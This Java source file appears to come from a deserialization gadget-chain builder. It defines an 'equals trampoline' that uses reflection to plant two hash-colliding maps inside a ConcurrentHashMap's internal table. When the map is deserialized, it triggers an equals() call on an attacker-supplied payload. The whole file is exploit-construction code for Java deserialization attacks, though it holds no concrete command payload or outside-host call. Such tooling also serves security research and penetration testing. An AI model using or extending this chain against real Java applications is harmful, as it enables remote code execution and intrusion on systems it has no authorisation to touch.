package org.ses.gadgetbuilder.impl.trampolines.equals;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.EqualsTrampoline;
import org.ses.gadgetbuilder.impl.trampolines.hashcode.ConcurrentHashMapTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.concurrent.ConcurrentHashMap;

@Authors(Authors.BofeiC)
public class ConcurrentHashMapEquals implements EqualsTrampoline {
    @Override
    public Object wrapPayload(Object payload, Object param) throws Exception {

        Object conHashMap = new ConcurrentHashMap<Object,Object>();

        ConcurrentHashMap map1 = new ConcurrentHashMap();
        ConcurrentHashMap map2 = new ConcurrentHashMap();
        map1.put("yy",param);
        map1.put("zZ",payload);
        map2.put("yy",payload);
        map2.put("zZ",param);

        Object node1 = Reflections.createWithoutConstructor(Class.forName("java.util.concurrent.ConcurrentHashMap$Node"));
        Reflections.setFieldValue(node1, "key", map1);
        Reflections.setFieldValue(node1, "val", "1");

        Object node2 = Reflections.createWithoutConstructor(Class.forName("java.util.concurrent.ConcurrentHashMap$Node"));
        Reflections.setFieldValue(node2, "key", map2);
        Reflections.setFieldValue(node2, "val", "1");

        Object conHashMapTbl = Array.newInstance(Class.forName("java.util.concurrent.ConcurrentHashMap$Node"), 2);
        Array.set(conHashMapTbl, 0, node1);
        Array.set(conHashMapTbl, 1, node2);

        Reflections.setFieldValue(conHashMap, "table", conHashMapTbl);
        Reflections.setFieldValue(conHashMap, "sizeCtl", 2);



        return conHashMap;
    }
}
